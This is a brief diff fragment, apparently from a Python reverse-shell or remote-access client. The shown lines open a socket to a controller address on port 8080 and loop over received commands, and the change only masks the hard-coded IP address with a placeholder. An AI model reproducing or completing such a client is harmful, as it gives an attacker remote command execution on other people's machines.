@@ -29,7 +29,7 @@ def download(s, command):
         
 def connect():
     s = socket.socket()
-    s.connect(("192.168.2.133", 8080))
+    s.connect(("192.168.x.x", 8080))
  
     while True:
         command = s.recv(1024).decode()
